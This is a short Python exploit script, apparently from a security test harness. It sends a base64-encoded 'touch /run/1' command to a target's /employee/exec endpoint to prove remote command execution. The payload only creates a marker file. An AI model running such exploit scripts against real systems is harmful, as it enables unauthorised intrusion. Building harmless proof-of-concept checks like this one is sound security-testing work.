from BaseExploit import *

import requests

def Host_Mount(host, port):
    url=f"http://{host}:{port}/employee/exec"
    # touch /run/1
    res = requests.get(
        url=url,
        headers="",
        cookies="",
        params={"cmd":"dG91Y2ggL3J1bi8x"},
    )
    # print(res.text)

Exploit(Host_Mount, args.host, args.port)()